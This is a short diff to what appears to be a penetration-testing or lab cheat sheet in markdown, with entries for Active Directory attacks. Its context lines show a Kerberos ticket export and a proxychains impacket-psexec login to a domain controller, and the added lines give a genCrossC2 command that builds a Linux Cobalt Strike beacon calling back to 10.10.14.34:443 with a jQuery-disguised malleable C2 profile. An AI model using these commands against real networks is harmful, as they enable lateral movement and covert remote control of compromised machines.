@@ -342,6 +342,10 @@ export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
 ```
 proxychains -q -f web05.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
 ```
+crossc2
+```
+./genCrossC2.Linux 10.10.14.34 443 .cobaltstrike.beacon_keys ";;/opt/malleable-c2/jquery-c2.4.9.profile" Linux x64 hola.elf
+```
 constrained delegation
 ```
 get-domaincomputer -trustedtoauth
